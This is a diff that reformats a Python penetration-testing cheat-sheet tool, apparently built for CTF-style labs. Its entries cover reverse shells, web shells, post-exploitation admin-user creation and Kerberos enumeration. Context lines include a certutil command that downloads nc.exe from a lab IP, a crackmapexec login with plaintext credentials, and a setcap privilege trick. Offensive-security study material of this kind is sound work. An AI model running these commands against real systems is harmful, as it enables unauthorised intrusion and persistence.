@@ -1,25 +1,27 @@
 class Cheat:
-	def __init__(self, name):
-		self.name = name
-		self.category = None
-		self.subCategory = None
-		self.output = None
-		self.addToList()
+    def __init__(self, name):
+        self.name = name
+        self.category = None
+        self.subCategory = None
+        self.output = None
+        self.addToList()
 
-	def addToList(self):
-		global cheatList
-		cheatList.append(self)
+    def addToList(self):
+        global cheatList
+        cheatList.append(self)
+
 
 class Color:
-	HEADER = '\033[95m'
-	OK_BLUE = '\033[94m'
-	OK_CYAN = '\033[96m'
-	OK_GREEN = '\033[92m'
-	WARNING = '\033[93m'
-	FAIL = '\033[91m'
-	RESET = '\033[0m'
-	BOLD = '\033[1m'
-	GRAY = '\033[90m'
+    HEADER = "\033[95m"
+    OK_BLUE = "\033[94m"
+    OK_CYAN = "\033[96m"
+    OK_GREEN = "\033[92m"
+    WARNING = "\033[93m"
+    FAIL = "\033[91m"
+    RESET = "\033[0m"
+    BOLD = "\033[1m"
+    GRAY = "\033[90m"
+
 
 cheatList = []
 
@@ -46,7 +48,7 @@ Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { whoami }
 ######################################
 
 icmp_reverse_shell_windows = Cheat(
-	"ICMP - Reverse Shell Windows / ToBase64String / FromBase64String (Nishang)"
+    "ICMP - Reverse Shell Windows / ToBase64String / FromBase64String (Nishang)"
 )
 icmp_reverse_shell_windows.category = "Windows"
 icmp_reverse_shell_windows.subCategory = "Reverse Shell"
@@ -101,7 +103,7 @@ cacls C:\PATH\File.ext
 ######################################
 
 alternative_data_streams = Cheat(
-	"Alternate Data Streams (MetaData), hide file in a file"
+    "Alternate Data Streams (MetaData), hide file in a file"
 )
 alternative_data_streams.category = "Windows"
 alternative_data_streams.subCategory = "Utility"
@@ -124,7 +126,9 @@ type C:\Temp\\backup.zip:pass
 ######################################
 ######################################
 
-firewall_rules_change_to_accept_IP_Attacker = Cheat("Create new local user with administrator privilege - Firewall Rules - PostExploit")
+firewall_rules_change_to_accept_IP_Attacker = Cheat(
+    "Create new local user with administrator privilege - Firewall Rules - PostExploit"
+)
 firewall_rules_change_to_accept_IP_Attacker.category = "Windows"
 firewall_rules_change_to_accept_IP_Attacker.subCategory = "PostExploit"
 firewall_rules_change_to_accept_IP_Attacker.output = """[*] Create new local user with administrator privilege...
@@ -200,7 +204,7 @@ sudo restart ipsec
 ######################################
 
 file_transfere_windows_iwr = Cheat(
-	"File Transfere Windows - IWR - Invoke-WebRequest / IEX - WebClient downloadString / certutil.exe"
+    "File Transfere Windows - IWR - Invoke-WebRequest / IEX - WebClient downloadString / certutil.exe"
 )
 file_transfere_windows_iwr.category = "Windows"
 file_transfere_windows_iwr.subCategory = "File Transfere"
@@ -224,7 +228,7 @@ certutil -urlcache -f http://10.10.14.53:80/nc.exe C:\Temp\\nc.exe
 ######################################
 
 file_transfere_windows_smbserver = Cheat(
-	"File Transfere Windows - SmbServer.py (Impacket)"
+    "File Transfere Windows - SmbServer.py (Impacket)"
 )
 file_transfere_windows_smbserver.category = "Windows"
 file_transfere_windows_iwr.subCategory = "File-Transfere"
@@ -293,7 +297,7 @@ crackmapexec winrm 10.10.10.193 -u 'svc-print' -p '$fab@s3Rv1ce$1'
 ######################################
 
 cewl = Cheat(
-	"cewl - Create a list of password (or something) from all words of a html page"
+    "cewl - Create a list of password (or something) from all words of a html page"
 )
 cewl.category = "Tools"
 cewl.subCategory = "Passwords"
@@ -605,7 +609,7 @@ done
 ######################################
 
 find_and_grep = Cheat(
-	"Find - Grep for Basic enumeration Linux (Clear Usernames or passes, SUID)"
+    "Find - Grep for Basic enumeration Linux (Clear Usernames or passes, SUID)"
 )
 find_and_grep.category = "Linux"
 find_and_grep.subCategory = "Utility"
@@ -695,7 +699,7 @@ tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21 # tcpdump tcp dst [ip] 
 ######################################
 
 capabilities = Cheat(
-	"Capabilities - setcap / getcap / setuid - Basic enumeration Linux"
+    "Capabilities - setcap / getcap / setuid - Basic enumeration Linux"
 )
 capabilities.category = "Linux"
 capabilities.subCategory = "Enumeration"
@@ -710,7 +714,9 @@ setcap cap_setuid+ep /path/to/binary  # set uid for scale faster praticaly invis
 ######################################
 ######################################
 
-findSubDomain_dns = Cheat("nslookup / dig / dnsenum / virtual hosts - Get SubDomain - DNS")
+findSubDomain_dns = Cheat(
+    "nslookup / dig / dnsenum / virtual hosts - Get SubDomain - DNS"
+)
 findSubDomain_dns.category = "Tools"
 findSubDomain_dns.subCategory = "DNS"
 findSubDomain_dns.output = """[*] Some tools to find sub domains...
@@ -890,7 +896,7 @@ webShell.output = """[*] Web Shell em PHP
 ######################################
 
 fakeShell = Cheat(
-	"Fake Shell in bash for web shell with parameter and RCE - urlencoded"
+    "Fake Shell in bash for web shell with parameter and RCE - urlencoded"
 )
 fakeShell.category = "Web"
 fakeShell.subCategory = "RCE"
@@ -920,7 +926,9 @@ done
 ######################################
 ######################################
 
-treeWorpress = Cheat("Wordpress - WP - Tree/structure of basic wordpress path and files")
+treeWorpress = Cheat(
+    "Wordpress - WP - Tree/structure of basic wordpress path and files"
+)
 treeWorpress.category = "Web"
 treeWorpress.subCategory = "CMS"
 treeWorpress.output = """[*] Wordpress basic structure path and files
@@ -1417,7 +1425,9 @@ john --wordlist=/usr/share/wordlist/rockyou.txt hash
 ######################################
 ######################################
 
-sqsh = Cheat("sqsh - sqsh - Interactive database shell (mysql for 1433/tcp  open  ms-sql-s) - mssqlclient.py")
+sqsh = Cheat(
+    "sqsh - sqsh - Interactive database shell (mysql for 1433/tcp  open  ms-sql-s) - mssqlclient.py"
+)
 sqsh.category = "Tools"
 sqsh.subCategory = "Databases"
 sqsh.output = """[*] sqsh - Interactive database shell
@@ -1616,7 +1626,9 @@ upx executableFile
 ######################################
 ######################################
 
-kerbrute = Cheat("kerbrute / GetNPUsers.py - Enumerate Users from DC/AD Windows through Kerberos Pre-Authentication (AS-REP Roasting)")
+kerbrute = Cheat(
+    "kerbrute / GetNPUsers.py - Enumerate Users from DC/AD Windows through Kerberos Pre-Authentication (AS-REP Roasting)"
+)
 kerbrute.category = "Windows"
 kerbrute.subCategory = "Kerberos"
 kerbrute.output = """[*] KERBRUTE - A tool to quickly bruteforce and enumerate valid Active Directory accounts through Kerberos Pre-Authentication
